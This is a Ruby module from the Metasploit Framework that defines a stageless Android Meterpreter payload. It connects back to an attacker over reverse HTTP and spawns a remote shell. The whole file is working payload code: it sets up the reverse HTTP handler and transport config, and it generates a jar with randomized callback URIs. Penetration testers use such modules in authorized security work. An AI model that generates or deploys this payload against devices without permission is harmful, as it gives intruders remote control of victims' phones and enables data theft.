##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_http'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/android'
require 'msf/core/payload/uuid/options'
require 'msf/base/sessions/meterpreter_android'
require 'msf/base/sessions/meterpreter_options'
require 'rex/payloads/meterpreter/config'

module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::TransportConfig
  include Msf::Payload::Single
  include Msf::Payload::Android
  include Msf::Payload::UUID::Options
  include Msf::Sessions::MeterpreterOptions


  def initialize(info = {})

    super(merge_info(info,
      'Name'        => 'Android Meterpreter Shell, Reverse HTTP Inline',
      'Description' => 'Connect back to attacker and spawn a Meterpreter shell',
      'License'     => MSF_LICENSE,
      'Platform'    => 'android',
      'Arch'        => ARCH_DALVIK,
      'Handler'     => Msf::Handler::ReverseHttp,
      'Session'     => Msf::Sessions::Meterpreter_Java_Android,
      'Payload'     => '',
      ))
  end

  #
  # Generate the transport-specific configuration
  #
  def transport_config(opts={})
    transport_config_reverse_http(opts)
  end

  def generate_jar(opts={})
    uri_req_len = 30 + luri.length + rand(256 - (30 + luri.length))
    opts[:uri] = generate_uri_uuid_mode(:connect, uri_req_len)
    opts[:stageless] = true
    super(opts)
  end
end
